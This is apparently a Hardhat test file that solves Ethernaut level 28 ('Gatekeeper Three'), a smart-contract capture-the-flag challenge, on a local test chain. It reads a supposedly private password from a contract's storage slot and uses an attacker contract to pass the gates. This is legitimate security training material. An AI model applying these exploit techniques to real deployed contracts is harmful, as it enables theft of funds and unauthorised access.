import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {GatekeeperThree} from '../../types/typechain';
import {getStorage} from '../../utils';

describe('Ethernaut 28: Gatekeeper Three', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: GatekeeperThree;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('GatekeeperThree', owner).then(f => f.deploy());
    await contract.deployed();

    // create trick
    await contract.createTrick();

    // send some ethers to contract
    await owner.sendTransaction({
      to: contract.address,
      value: ethers.utils.parseEther('0.0011'),
    });
  });

  it('should get past the gates', async () => {
    const attackerContract = await ethers.getContractFactory('GatekeeperThreeAttacker', attacker).then(f => f.deploy());

    // get password from storage
    const password = await getStorage(await contract.trick(), 2);

    // enter!
    await attackerContract.connect(attacker).enter(contract.address, password);
  });

  after(async () => {
    expect(await contract.entrant()).to.eq(attacker.address);
  });
});
